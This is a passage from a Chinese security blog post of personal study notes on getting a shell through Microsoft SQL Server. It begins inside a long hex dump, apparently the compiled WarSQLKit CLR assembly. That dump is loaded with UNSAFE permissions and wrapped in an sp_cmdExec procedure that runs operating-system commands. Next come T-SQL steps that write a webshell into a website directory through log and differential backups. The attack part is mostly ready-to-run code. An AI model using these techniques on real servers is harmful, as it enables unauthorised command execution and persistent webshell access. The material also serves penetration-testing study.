74617274007365745f52656469726563745374616e646172644f7574707574007374644f75747075740053797374656d2e546578740053716c436f6e74657874007365745f4372656174654e6f57696e646f770049734e756c6c4f72456d707479000000004143006f006d006d0061006e0064002000690073002000720075006e006e0069006e0067002c00200070006c006500610073006500200077006100690074002e00000f63006d0064002e00650078006500000920002f006300200000334f00530020006500720072006f00720020007700680069006c006500200065007800650063007500740069006e006700200000053a002000001753007400640020006f00750074007000750074003a0000372000660069006e00690073006800650064002000770069007400680020006500780069007400200063006f006400650020003d0020000000c1b0e79eb8eb6348be1e0c1d83c2d05800042001010803200001052001011111042001010e04000012550500020e0e0e0c0706120c123d0e1241124508042000125d040001020e0420010102052001011161052002011c180520010112650320000204200012690320000e0500010e1d0e0320000805200112450e08b77a5c561934e08903061245040001010e062002011c124d0801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010801000200000000001501001057617253514c4b69744d696e696d616c00000501000000000f01000a457975702043454c494b00001c010017687474703a2f2f6579757063656c696b2e636f6d2e747200000c010007312e302e302e3000000401000000d82c00000000000000000000f22c0000002000000000000000000000000000000000000000000000e42c0000000000000000000000005f436f72446c6c4d61696e006d73636f7265652e646c6c0000000000ff25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000005c03000000000000000000005c0334000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000001000000000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b004bc020000010053007400720069006e006700460069006c00650049006e0066006f0000009802000001003000300030003000300034006200300000001a000100010043006f006d006d0065006e007400730000000000000022000100010043006f006d00700061006e0079004e0061006d00650000000000000000004a0011000100460069006c0065004400650073006300720069007000740069006f006e0000000000570061007200530051004c004b00690074004d0069006e0069006d0061006c0000000000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e00300000004a001500010049006e007400650072006e0061006c004e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c00000000005400180001004c006500670061006c0043006f007000790072006900670068007400000068007400740070003a002f002f006500790075007000630065006c0069006b002e0063006f006d002e007400720000002a00010001004c006500670061006c00540072006100640065006d00610072006b00730000000000000000005200150001004f0072006900670069006e0061006c00460069006c0065006e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c000000000036000b000100500072006f0064007500630074004e0061006d0065000000000045007900750070002000430045004c0049004b0000000000340008000100500072006f006400750063007400560065007200730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000031002e0030002e0030002e003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000c000000043d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;</span><br><span class="line">--创建存储过程,单独执行</span><br><span class="line">CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec;</span><br><span class="line">--执行命令</span><br><span class="line">EXEC sp_cmdExec &#x27;whoami&#x27;;</span><br><span class="line">--删除该程序集</span><br><span class="line">DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit];</span><br></pre></td></tr></table></figure>
+
+<h2 id="db-owner权限"><a href="#db-owner权限" class="headerlink" title="db_owner权限"></a>db_owner权限</h2><h3 id="LOG备份"><a href="#LOG备份" class="headerlink" title="LOG备份"></a>LOG备份</h3><ul>
+<li>存在数据库备份文件</li>
+<li>网站的绝对路径</li>
+<li>堆叠注入</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter database 数据库名 set RECOVERY FULL;   --修改数据库恢复模式为 完整模式</span><br><span class="line">create table cmd (a image);        --创建一张表cmd，只有一个列 a，类型为image</span><br><span class="line">backup log 数据库名 to disk= &#x27;C:\phpstudy\WWW\1.php&#x27; with init;   --备份表到指定路径</span><br><span class="line">insert into cmd (a) values(木马十六进制);  --插入一句话到cmd表里</span><br><span class="line">backup log 数据库名 to disk=&#x27;C:\phpstudy\WWW\2.php&#x27;;   --把操作日志备份到指定文件</span><br><span class="line">drop table cmd;    --删除cmd表</span><br></pre></td></tr></table></figure>
+
+<p><code>2.php</code>为木马文件</p>
+<h3 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a>差异备份</h3><blockquote>
+<p>注：差异备份有概率会把网站搞崩，所以不建议使用差异备份</p>
+</blockquote>
+<ul>
+<li>网站的绝对路径</li>
+<li>堆叠注入</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table [dbo].[test] ([cmd] [image])</span><br><span class="line"></span><br><span class="line">declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x6b 68617a backup log @a to disk = @s with init,no_truncate</span><br><span class="line"></span><br><span class="line">insert into [test](cmd) values(木马十六进制)</span><br><span class="line"></span><br><span class="line">declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=绝对路径十六进制 backup log @a to disk=@s with init,no_truncate</span><br><span class="line"></span><br><span class="line">Drop table [test]</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="补充–待学习"><a href="#补充–待学习" class="headerlink" title="补充–待学习"></a>补充–待学习</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7534#toc-17">https://xz.aliyun.com/t/7534#toc-17</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MSSQL 2017--Python和R脚本</span><br><span class="line">沙盒命令执行</span><br><span class="line">Agent Job命令执行</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8603">MSSQL GetShell方法 - 先知社区</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://Fgtbnc.github.io">Khaz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://fgtbnc.github.io/2023/05/01/Sqlserver/">http://fgtbnc.github.io/2023/05/01/Sqlserver/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://Fgtbnc.github.io" target="_blank">Khaz</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://fgtbnc.github.io/images/wallhaven-xlz933.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/05/30/%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/"><img class="prev-cover" src="https://fgtbnc.github.io/images/wallhaven-xl8gq3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">常见名词与概念</div></div></a></div><div class="next-post pull-right"><a href="/2023/05/01/Weblogic/"><img class="next-cover" src="https://fgtbnc.github.io/images/wallhaven-xlz933.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Weblogic漏洞</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/Khazing/typora-img/main/16870577801892f4a9c5aac2e9e5422a6ccd26db10dd88c73.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Khaz</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">脚本小子的学习笔记</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.1.</span> <span class="toc-text">系统数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90"><span class="toc-number">2.2.</span> <span class="toc-text">权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">2.3.</span> <span class="toc-text">注释符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E5%92%8C%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.</span> <span class="toc-text">变量和函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E8%A1%A8"><span class="toc-number">2.5.</span> <span class="toc-text">数据表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.6.</span> <span class="toc-text">语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%89%8B%E6%AE%B5"><span class="toc-number">3.</span> <span class="toc-text">注入手段</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.4.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GetShell"><span class="toc-number">4.</span> <span class="toc-text">GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%F0%9F%94%8D"><span class="toc-number">4.1.</span> <span class="toc-text">绝对路径🔍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SA%E6%9D%83%E9%99%90"><span class="toc-number">4.2.</span> <span class="toc-text">SA权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-cmdshell"><span class="toc-number">4.2.1.</span> <span class="toc-text">xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sp-oacreate"><span class="toc-number">4.2.2.</span> <span class="toc-text">sp_oacreate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLR%E5%8A%9F%E8%83%BD"><span class="toc-number">4.2.3.</span> <span class="toc-text">CLR功能</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#db-owner%E6%9D%83%E9%99%90"><span class="toc-number">4.3.</span> <span class="toc-text">db_owner权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LOG%E5%A4%87%E4%BB%BD"><span class="toc-number">4.3.1.</span> <span class="toc-text">LOG备份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BD"><span class="toc-number">4.3.2.</span> <span class="toc-text">差异备份</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E2%80%93%E5%BE%85%E5%AD%A6%E4%B9%A0"><span class="toc-number">5.</span> <span class="toc-text">补充–待学习</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/03/%E5%AE%9E%E4%B9%A0%E5%B0%8F%E7%BB%93/" title="实习小结"><img src="https://fgtbnc.github.io/images/wallhaven-xl8gq3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="实习小结"/></a><div class="content"><a class="title" href="/2023/08/03/%E5%AE%9E%E4%B9%A0%E5%B0%8F%E7%BB%93/" title="实习小结">实习小结</a><time datetime="2023-08-03T02:26:00.000Z" title="发表于 2023-08-03 10:26:00">2023-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/25/openfire/" title="Openfire身份认证绕过+插件Getshell漏洞复现"><img src="https://fgtbnc.github.io/images/wallhaven-r29l9q.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Openfire身份认证绕过+插件Getshell漏洞复现"/></a><div class="content"><a class="title" href="/2023/06/25/openfire/" title="Openfire身份认证绕过+插件Getshell漏洞复现">Openfire身份认证绕过+插件Getshell漏洞复现</a><time datetime="2023-06-25T15:00:25.000Z" title="发表于 2023-06-25 23:00:25">2023-06-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/24/Apache%20Druid/" title="Apache Druid RCE漏洞复现(QVD-2023-9629)"><img src="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Apache Druid RCE漏洞复现(QVD-2023-9629)"/></a><div class="content"><a class="title" href="/2023/06/24/Apache%20Druid/" title="Apache Druid RCE漏洞复现(QVD-2023-9629)">Apache Druid RCE漏洞复现(QVD-2023-9629)</a><time datetime="2023-06-24T08:00:25.000Z" title="发表于 2023-06-24 16:00:25">2023-06-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Spring框架漏洞"><img src="https://fgtbnc.github.io/images/wallhaven-xlz933.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring框架漏洞"/></a><div class="content"><a class="title" href="/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Spring框架漏洞">Spring框架漏洞</a><time datetime="2023-06-22T02:40:25.000Z" title="发表于 2023-06-22 10:40:25">2023-06-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="若依漏洞"><img src="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="若依漏洞"/></a><div class="content"><a class="title" href="/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="若依漏洞">若依漏洞</a><time datetime="2023-06-21T13:11:25.000Z" title="发表于 2023-06-21 21:11:25">2023-06-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Khaz</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="/js/chocolate.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
